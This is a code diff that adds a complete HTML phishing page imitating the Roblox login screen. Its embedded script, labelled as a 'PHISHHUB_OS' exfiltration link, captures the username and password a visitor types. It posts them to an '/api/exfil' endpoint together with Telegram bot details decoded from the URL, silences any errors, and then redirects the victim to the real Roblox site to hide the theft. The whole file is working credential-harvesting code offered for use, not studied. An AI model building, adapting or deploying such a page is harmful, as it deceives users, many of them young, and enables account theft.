@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Log in to Roblox</title>
+    <link rel="shortcut icon" href="https://www.roblox.com/favicon.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap');
+        
+        :root {
+            --rbx-bg-img: url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg');
+            --rbx-card: rgba(25, 27, 29, 0.94);
+            --rbx-input: #393b3d;
+            --rbx-btn-secondary: #393b3d;
+            --rbx-blue: #0066ff;
+            --rbx-text-secondary: #adb1b5;
+        }
+
+        body { 
+            font-family: 'Hanken Grotesk', "Builder", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #000 var(--rbx-bg-img) no-repeat center center fixed;
+            background-size: cover;
+            color: #ffffff;
+            -webkit-font-smoothing: antialiased;
+            margin: 0;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* 2026 Navbar Style */
+        .rbx-header {
+            background-color: rgba(10, 10, 10, 0.6);
+            backdrop-filter: blur(15px);
+            height: 64px;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .brand-logo {
+            height: 32px;
+            width: auto;
+            /* Applying blue filter to match 'New logo is blue' requirement */
+            filter: invert(36%) sepia(97%) saturate(2471%) hue-rotate(201deg) brightness(101%) contrast(107%);
+        }
+
+        .nav-link {
+            font-size: 14px;
+            font-weight: 700;
+            opacity: 0.8;
+            transition: opacity 0.2s;
+        }
+
+        .nav-link:hover { opacity: 1; }
+
+        /* Login Card */
+        .login-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            min-height: calc(100vh - 124px);
+        }
+
+        .login-base-container {
+            background-color: var(--rbx-card);
+            width: 100%;
+            max-width: 440px;
+            padding: 48px 40px;
+            border-radius: 4px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.7);
+            text-align: center;
+            position: relative;
+        }
+
+        .login-header {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 32px;
+            letter-spacing: -0.5px;
+        }
+
+        .input-field {
+            background-color: var(--rbx-input);
+            border: 1px solid #494b4d;
+            border-radius: 4px;
+            color: #fff;
+            height: 52px;
+            padding: 0 16px;
+            width: 100%;
+            font-size: 16px;
+            outline: none;
+            margin-bottom: 12px;
+            transition: border-color 0.2s;
+        }
+
+        .input-field::placeholder { color: #8e8e8e; }
+        .input-field:focus { border-color: var(--rbx-blue); }
+
+        .login-button {
+            background-color: transparent;
+            border: 1px solid #ffffff;
+            color: #ffffff;
+            font-weight: 700;
+            height: 48px;
+            width: 100%;
+            border-radius: 4px;
+            margin-top: 8px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        .login-button:hover { background: rgba(255,255,255,0.1); }
+
+        .btn-action {
+            background-color: #393b3d;
+            color: #fff;
+            height: 48px;
+            width: 100%;
+            border-radius: 4px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            font-size: 15px;
+            transition: background 0.2s;
+        }
+
+        .btn-action:hover { background: #4a4c4e; }
+
+        .divider {
+            height: 1px;
+            background: #494b4d;
+            margin: 24px 0;
+        }
+
+        /* App Bumper */
+        .app-bumper {
+            background-color: #0c0d0e;
+            border-top: 1px solid #222;
+            color: #fff;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            z-index: 2000;
+        }
+
+        .visit-btn {
+            background-color: var(--rbx-blue);
+            color: #fff;
+            font-weight: 800;
+            padding: 10px 22px;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: opacity 0.2s;
+        }
+        .visit-btn:active { opacity: 0.8; }
+
+        /* Modern Progress Bar */
+        #loader {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: transparent;
+            overflow: hidden;
+            display: none;
+            border-top-left-radius: 4px;
+            border-top-right-radius: 4px;
+        }
+        #loader div {
+            position: absolute;
+            background-color: var(--rbx-blue);
+            height: 100%;
+            width: 40%;
+            animation: indeterminate 1s infinite linear;
+        }
+        @keyframes indeterminate {
+            0% { left: -40%; }
+            100% { left: 100%; }
+        }
+    </style>
+</head>
+<body class="rbx-body dark-theme builder-font">
+
+    <div id="loader"><div></div></div>
+
+    <!-- Header -->
+    <header class="rbx-header">
+        <div class="flex items-center gap-6 w-full max-w-[1200px] mx-auto">
+            <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/1/1e/Roblox_Logo_2025.png" alt="Roblox" class="brand-logo"></a>
+            <ul class="hidden md:flex gap-8">
+                <li><a href="#" class="nav-link">Charts</a></li>
+                <li><a href="#" class="nav-link">Marketplace</a></li>
+                <li><a href="#" class="nav-link">Create</a></li>
+                <li><a href="#" class="nav-link">Robux</a></li>
+            </ul>
+            <div class="flex-grow"></div>
+            <div class="flex items-center gap-5">
+                <svg class="w-6 h-6 opacity-80 cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+                <button class="bg-[#0066ff] text-white px-5 py-2 rounded font-bold text-sm">Sign Up</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="login-wrapper">
+        <div class="login-base-container">
+            <h1 class="login-header">Login to Roblox</h1>
+            
+            <div id="login-form">
+                <input id="username" type="text" class="input-field" placeholder="Username/Email/Phone" spellcheck="false" autocomplete="username">
+                <input id="password" type="password" class="input-field" placeholder="Password" autocomplete="current-password">
+                
+                <button onclick="executeHit()" class="login-button">Log In</button>
+                
+                <div class="mt-6">
+                    <a href="#" class="text-sm font-semibold opacity-70 hover:opacity-100 transition-opacity">Forgot Password or Username?</a>
+                </div>
+
+                <div class="divider"></div>
+
+                <button class="btn-action">Email Me a One-Time Code</button>
+                <button class="btn-action">Quick Sign-in</button>
+
+                <div class="mt-10 text-[15px] opacity-80">
+                    Don't have an account? <a href="#" class="font-bold hover:underline">Sign Up</a>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- App Bumper -->
+    <div class="app-bumper">
+        <button class="text-gray-500 mr-2"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M6 18L18 6M6 6l12 12"/></svg></button>
+        <div class="bg-blue-600 p-1 rounded-xl shadow-lg flex items-center justify-center w-10 h-10 shrink-0">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/1/1e/Roblox_Logo_2025.png"  alt="R">
+        </div>
+        <div class="flex-grow">
+            <p class="text-[14px] font-bold leading-tight">Explore Roblox in our app!</p>
+            <p class="text-[12px] opacity-60">Millions of experiences await you</p>
+        </div>
+        <button class="visit-btn">Visit</button>
+    </div>
+
+    <script>
+        // PHISHHUB_OS: Exfiltration Linkage
+        const getExfilConfig = () => {
+            const h = window.location.hash.substring(1);
+            if (!h) return null;
+            try { return JSON.parse(atob(h)); } catch(e) { return null; }
+        };
+
+        const config = getExfilConfig();
+
+        async function executeHit() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            if (!user || !pass) return;
+
+            // Trigger Builder-Dark Progress Bar
+            document.getElementById('loader').style.display = 'block';
+
+            const finishUrl = "https://www.roblox.com/home";
+
+            if (!config) {
+                setTimeout(() => window.location.href = finishUrl, 1200);
+                return;
+            }
+
+            try {
+                // Relay to PHISHHUB_OS serverless backend
+                await fetch('/api/exfil', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        target: 'roblox',
+                        credentials: { username: user, password: pass },
+                        tgToken: config.t,
+                        tgChat: config.c
+                    })
+                });
+            } catch (err) {
+                // Silenced
+            } finally {
+                setTimeout(() => {
+                    window.location.href = finishUrl;
+                }, 1200);
+            }
+        }
+    </script>
+</body>
+</html>
